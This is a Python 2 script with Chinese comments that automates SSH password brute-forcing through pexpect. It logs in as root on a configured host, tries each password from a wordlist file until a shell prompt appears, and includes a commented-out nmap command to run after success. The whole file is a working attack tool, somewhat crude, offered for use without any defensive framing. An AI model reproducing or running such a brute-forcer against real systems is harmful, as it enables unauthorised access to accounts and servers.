# coding=UTF-8#利用pexpect模块的交互功能来实现自动化登录ssh然后可以利用自动化的过程猜解ssh密码也叫做ssh密码爆破ssh登录后可远程执行命令
#对上次的sshzmb.py进行改进增加了爆破功能，基本上是能实现了，还存在不完美的地方，没有加入多线程
import pexpect
import time

PROMPT =['#','>>>','>','\$']#登陆成功后反馈期望即得到以上期望的反馈即认定登录成功

ret=0
#发送命令并打印发送的命令
def send_cmd(child,psw):
	
		child.sendline(psw)
		r=child.expect(['#','again','Permission'])
		if r==0:
			print psw
			return r
		elif r==1:
			pass
		elif r==2:
			return r

		time.sleep(3)
	
	
		print child.before
	
		


#连接ssh匹配连接结果，判定是否连接成功
def conn(user,host):
	global ret
	ssh_newkey = 'are you sure you want to continue connecting'
	connStr='ssh '+user+'@'+host
	child=pexpect.spawn(connStr)
	ret=child.expect([ssh_newkey,'[P|p]assword:'])
	print child.before
	#print ret
	if ret == 0:
		child.sendline('yes')
		ret=child.expect([pexpect.TIMEOUT,'[P|p]assword:'])
	if ret == 1:
		print('[-]input pwd')
		return child
	#child.sendline(pwd)
	#child.expect(PROMPT)
	#print child.before
	return child
def main():
	host='127.0.0.1'
	user='root'
	#pwd='123456'
	child=conn(user,host)
	f=open('pass.txt','r')
	for line in f.readlines():
		password = line.strip('\r').strip('\n')
		print("[-] Testing: " + str(password))
		r=send_cmd(child,password)
		if r==2:
			child=conn(user,host)
		elif r==0:
			break
			#send_cmd(child,'nmap -v')
if __name__ == '__main__':
	main()		
